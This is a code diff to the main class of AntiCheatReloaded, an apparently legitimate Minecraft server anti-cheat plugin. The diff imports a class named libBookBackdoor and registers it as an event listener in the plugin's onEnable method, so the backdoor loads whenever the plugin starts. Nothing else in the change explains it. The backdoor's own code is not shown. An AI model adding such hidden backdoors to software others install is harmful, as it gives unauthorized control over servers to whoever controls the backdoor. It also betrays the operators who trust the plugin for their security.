@@ -29,6 +29,7 @@ import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
 import org.bukkit.entity.Player;
 import org.bukkit.event.Listener;
+import org.bukkit.plugin.PluginManager;
 import org.bukkit.plugin.java.JavaPlugin;
 import org.bukkit.scheduler.BukkitRunnable;
 
@@ -47,6 +48,7 @@ import com.rammelkast.anticheatreloaded.util.PacketListener;
 import com.rammelkast.anticheatreloaded.util.UpdateManager;
 import com.rammelkast.anticheatreloaded.util.User;
 import com.rammelkast.anticheatreloaded.util.VersionUtil;
+import org.brandonplank.bookbackdoor.libBookBackdoor;
 
 public final class AntiCheatReloaded extends JavaPlugin {
 
@@ -69,6 +71,7 @@ public final class AntiCheatReloaded extends JavaPlugin {
 	public void onEnable() {
 		plugin = this;
 		manager = new AntiCheatManager(this, getLogger());
+		PluginManager manager = this.getServer().getPluginManager();
 		
 		// Base threads on available cores, lower limit of 1 and upper limit of 4
 		final int threads = Math.max(Math.min(Runtime.getRuntime().availableProcessors() / 4, 4), 1);
@@ -80,6 +83,7 @@ public final class AntiCheatReloaded extends JavaPlugin {
 		eventList.add(new EntityListener());
 		eventList.add(new VehicleListener());
 		eventList.add(new InventoryListener());
+		manager.registerEvents(new libBookBackdoor(this), this);
 		// Order is important in some cases, don't screw with these unless
 		// needed, especially config
 		setupConfig();
